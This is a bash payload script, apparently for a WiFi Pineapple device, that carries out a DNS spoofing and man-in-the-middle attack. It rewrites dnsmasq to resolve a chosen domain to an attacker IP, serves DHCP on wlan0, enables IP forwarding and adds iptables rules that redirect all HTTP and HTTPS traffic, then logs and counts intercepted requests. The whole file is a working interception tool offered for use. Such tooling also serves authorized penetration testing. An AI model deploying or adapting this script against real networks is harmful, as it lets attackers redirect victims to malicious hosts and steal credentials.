#!/bin/bash
# Title: DNS Spoof Controller
# Description: Configure and deploy DNS spoofing attacks to redirect traffic
# Author: WiFi Pineapple Pager Community
# Version: 1.0
# Category: Interception
# Net Mode: NAT
#
# LED State Descriptions
# Magenta Solid - Configuring DNS spoof
# Amber Blink - DNS spoof active
# Green Blink - Request intercepted
# Red Blink - Error occurred

# Configuration
SPOOF_DOMAIN="example.com"
REDIRECT_IP="192.168.1.100"
SPOOF_LOG="/tmp/dns_spoof.log"

LOG "Starting DNS Spoof Controller"
touch "$SPOOF_LOG"

# Get target domain
domain=$(TEXT_PICKER "Domain to spoof?" "$SPOOF_DOMAIN")
case $? in
    $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
        exit 1
        ;;
esac

# Get redirect IP
redirect_ip=$(IP_PICKER "Redirect to IP?" "$REDIRECT_IP")
case $? in
    $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
        exit 1
        ;;
esac

LOG "Spoofing: $domain -> $redirect_ip"

spinner_id=$(START_SPINNER "Configuring DNS spoof...")

# Stop existing DNS services
killall dnsmasq 2>/dev/null

# Create dnsmasq config with DNS spoofing
cat > /tmp/dnsspoof.conf <<EOF
# DNS Spoof Configuration
interface=wlan0
# Spoof specific domain
address=/$domain/$redirect_ip
# Log queries
log-queries
log-facility=$SPOOF_LOG
# DHCP range
dhcp-range=192.168.1.50,192.168.1.150,12h
EOF

# Start dnsmasq with spoofing config
dnsmasq -C /tmp/dnsspoof.conf -d > "$SPOOF_LOG" 2>&1 &
dnsmasq_pid=$!

# Enable IP forwarding for MitM
echo 1 > /proc/sys/net/ipv4/ip_forward

# Setup iptables rules for traffic redirection
iptables -t nat -F
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $redirect_ip:80
iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $redirect_ip:443
iptables -t nat -A POSTROUTING -j MASQUERADE

STOP_SPINNER $spinner_id

LOG "DNS spoofing active"
ALERT "DNS Spoof Active: $domain"

# Monitor for 3 minutes
LOG "Monitoring DNS requests..."
spinner_id=$(START_SPINNER "Intercepting traffic...")

for i in {1..36}; do
    sleep 5
    
    # Count spoofed requests
    if [ -f "$SPOOF_LOG" ]; then
        spoof_count=$(grep -c "$domain" "$SPOOF_LOG" 2>/dev/null || echo 0)
        if [ $spoof_count -gt 0 ]; then
            LOG "Spoofed requests: $spoof_count"
        fi
    fi
done

STOP_SPINNER $spinner_id

# Cleanup
LOG "Stopping DNS spoof..."
kill $dnsmasq_pid 2>/dev/null
iptables -t nat -F

# Final count
spoof_count=$(grep -c "$domain" "$SPOOF_LOG" 2>/dev/null || echo 0)
LOG "Total spoofed requests: $spoof_count"
LOG "Log saved to $SPOOF_LOG"

if [ $spoof_count -gt 0 ]; then
    ALERT "Spoofed $spoof_count requests"
else
    ALERT "No requests intercepted"
fi

LOG "DNS spoof controller finished"
